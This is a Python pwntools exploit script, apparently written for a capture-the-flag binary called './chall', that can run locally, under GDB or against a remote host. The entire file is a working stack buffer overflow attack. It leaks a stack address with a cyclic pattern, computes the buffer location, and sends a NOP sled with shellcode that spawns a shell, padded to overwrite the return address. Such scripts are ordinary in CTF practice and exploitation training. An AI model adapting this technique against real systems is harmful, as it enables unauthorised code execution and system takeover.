from pwn import *


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


gdbscript = """
init-pwndbg
b *engine+112
continue
""".format(**locals())

exe = "./chall"
elf = context.binary = ELF(exe, checksec=False)
context.log_level = "info"
context.terminal = "kitty"

io = start()

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

# Leak address
io.send(cyclic(0x40))
io.recvuntil(cyclic(0x40))
address = unpack(io.recvline()[:-1].ljust(8, b"\x00"))

log.info(f"Leak : {hex(address)}")
buffer = address - 336
log.info(f"Buffer : {hex(buffer)}")
offset = 328

payload = b"\x90" * 20
payload += shellcode
payload += b"\x90" * (offset - len(payload))
payload += p64(buffer)

io.sendline(payload)

io.interactive()
